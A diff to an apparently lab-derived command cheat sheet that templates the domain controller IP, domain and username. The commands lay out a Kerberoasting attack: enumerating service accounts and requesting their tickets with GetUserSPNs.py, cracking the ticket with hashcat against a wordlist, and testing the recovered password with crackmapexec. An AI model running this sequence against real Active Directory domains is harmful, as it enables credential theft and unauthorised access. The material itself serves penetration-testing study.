@@ -21,25 +21,25 @@ GetUserSPNs.py -h
 ## 3. `shellsession` _(output omitted)_
 
 ```bash
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}}
 ```
 
 ## 4. `shellsession` _(output omitted)_
 
 ```bash
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request 
 ```
 
 ## 5. `shellsession` _(output omitted)_
 
 ```bash
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev
 ```
 
 ## 6. `shellsession` _(output omitted)_
 
 ```bash
-GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
+GetUserSPNs.py -dc-ip {{DC_IP}} {{DOMAIN_UPPER}}/{{USERNAME}} -request-user sqldev -outputfile sqldev_tgs
 ```
 
 ## 7. `shellsession` _(output omitted)_
@@ -51,6 +51,6 @@ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
 ## 8. `shellsession` _(output omitted)_
 
 ```bash
-sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
+sudo crackmapexec smb {{DC_IP}} -u sqldev -p database!
 ```
 
